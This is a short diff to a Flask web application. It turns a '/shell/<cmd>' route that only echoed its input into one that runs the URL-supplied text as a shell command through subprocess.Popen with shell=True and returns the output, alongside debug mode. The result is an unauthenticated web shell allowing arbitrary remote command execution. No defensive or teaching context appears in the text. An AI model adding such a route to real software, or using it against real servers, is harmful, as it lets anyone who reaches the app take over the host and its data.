@@ -74,10 +74,10 @@ def logout():
 
 @app.route("/shell/<cmd>")
 def shell(cmd):
-    # p = subprocess.Popen(request.args.get('cmd'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    # stdout_data, stderr_data = p.communicate()
-    # return commands.getoutput(s)
-    return cmd
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout_data, stderr_data = p.communicate()
+    return stdout_data
+    # return cmd
 
 if __name__ == '__main__':
     app.debug = True
